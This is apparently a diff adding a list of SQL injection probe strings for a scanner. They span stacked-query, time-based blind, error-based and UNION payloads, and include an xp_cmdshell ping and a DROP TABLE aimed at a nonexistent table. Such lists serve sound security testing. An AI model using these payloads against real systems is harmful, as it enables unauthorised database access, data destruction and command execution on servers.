@@ -1,0 +1,13 @@
+'; SELECT 1--
+'; SELECT SLEEP(3)--
+'; WAITFOR DELAY '0:0:3'--
+'; DROP TABLE nonexistent_icescan--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' AND (SELECT 1 FROM (SELECT SLEEP(3))x)--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)--
+' AND 1=randomblob(100000000)--
+' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1)--
+' AND 1=1; EXEC xp_cmdshell 'ping -n 1 127.0.0.1'--
